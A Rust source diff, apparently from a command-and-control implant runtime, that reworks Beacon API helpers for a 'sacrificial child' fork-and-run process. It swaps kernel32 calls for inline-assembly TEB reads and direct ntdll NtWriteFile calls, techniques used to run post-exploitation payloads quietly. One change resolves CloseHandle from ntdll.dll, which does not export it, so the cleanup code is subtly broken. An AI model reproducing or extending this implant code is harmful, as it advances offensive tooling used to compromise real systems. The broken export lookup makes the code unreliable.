@@ -21,34 +21,52 @@ type GetStdHandleFn = unsafe extern "system" fn(u32) -> *mut c_void;
 type WriteFileFn =
     unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
 
-/// Write `bytes` to the inherited stdout pipe. Best-effort: if the handle or
-/// the export can't be resolved (e.g. the blob was launched without a
-/// redirected stdout), the fragment is dropped — output capture must never
-/// crash the host.
+/// Write `bytes` to the inherited stdout pipe (NtWriteFile over the
+/// parent-provided stdout handle stashed in the TEB gs:[0x1788] slot — the
+/// sacrificial child has no kernel32 to call GetStdHandle, but ntdll's
+/// NtWriteFile works on the inherited handle value directly). Best-effort:
+/// if the handle or the export can't be resolved (e.g. the blob was launched
+/// without a redirected stdout), the fragment is dropped — output capture
+/// must never crash the host.
 unsafe fn out_write(bytes: &[u8]) {
     if bytes.is_empty() {
         return;
     }
-    let (Some(gsh_addr), Some(wf_addr)) = (
-        unsafe { export_addr(b"kernel32.dll", b"GetStdHandle") },
-        unsafe { export_addr(b"kernel32.dll", b"WriteFile") },
-    ) else {
-        return;
-    };
-    let gsh: GetStdHandleFn = unsafe { core::mem::transmute(gsh_addr) };
-    let wf: WriteFileFn = unsafe { core::mem::transmute(wf_addr) };
-    let h = unsafe { gsh(STD_OUTPUT_HANDLE) };
-    // NULL = no such handle; INVALID_HANDLE_VALUE = console-less process.
-    if h.is_null() || h as usize == usize::MAX {
+    let handle: u64;
+    core::arch::asm!(
+        "mov {}, gs:[0x1788]",
+        out(reg) handle,
+        options(nostack, preserves_flags, readonly),
+    );
+    if handle == 0 {
         return;
     }
-    let mut written: u32 = 0;
+    let Some(wf_addr) = (unsafe { export_addr(b"ntdll.dll", b"NtWriteFile") }) else {
+        return;
+    };
+    type NtWriteFileFn = unsafe extern "system" fn(
+        *mut c_void, // FileHandle
+        *mut c_void, // Event
+        *mut c_void, // ApcRoutine
+        *mut c_void, // ApcContext
+        *mut u8,     // IoStatusBlock
+        *const u8,   // Buffer
+        u32,         // Length
+        *mut c_void, // ByteOffset
+        *mut u32,    // Key
+    ) -> i32;
+    let wf: NtWriteFileFn = unsafe { core::mem::transmute(wf_addr) };
+    let mut io_status = [0u8; 16]; // IO_STATUS_BLOCK
     let _ = unsafe {
         wf(
-            h,
+            handle as *mut c_void,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+            io_status.as_mut_ptr(),
             bytes.as_ptr(),
             bytes.len() as u32,
-            &mut written,
+            core::ptr::null_mut(),
             core::ptr::null_mut(),
         )
     };
@@ -486,7 +504,7 @@ pub unsafe extern "C" fn BeaconCleanupProcess(pi: *mut core::ffi::c_void) {
     }
     // PROCESS_INFORMATION layout (Win64): HANDLE hProcess, hThread; DWORD pid, tid.
     type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
-    if let Some(addr) = unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+    if let Some(addr) = unsafe { export_addr(b"ntdll.dll", b"CloseHandle") } {
         let close: CloseHandle = unsafe { core::mem::transmute(addr) };
         let base = pi as *const usize;
         let (h_proc, h_thread) = unsafe { (*base, *base.add(1)) };
@@ -550,11 +568,15 @@ pub unsafe extern "C" fn BeaconInformation(info: *mut BeaconInfo) {
     unsafe {
         core::ptr::write_bytes(info, 0, 1);
         (*info).version = BEACON_INFO_VERSION;
-        if let Some(addr) = export_addr(b"kernel32.dll", b"GetCurrentProcessId") {
-            type GetPid = unsafe extern "system" fn() -> u32;
-            let f: GetPid = core::mem::transmute(addr);
-            (*info).pid = f();
-        }
+        // No kernel32 in the sacrificial child (loader never ran): read the
+        // process id straight from the TEB ClientId (gs:[0x40]).
+        let pid: u64;
+        core::arch::asm!(
+            "mov {}, gs:[0x40]",
+            out(reg) pid,
+            options(nostack, preserves_flags, readonly),
+        );
+        (*info).pid = pid as u32;
     }
 }
 
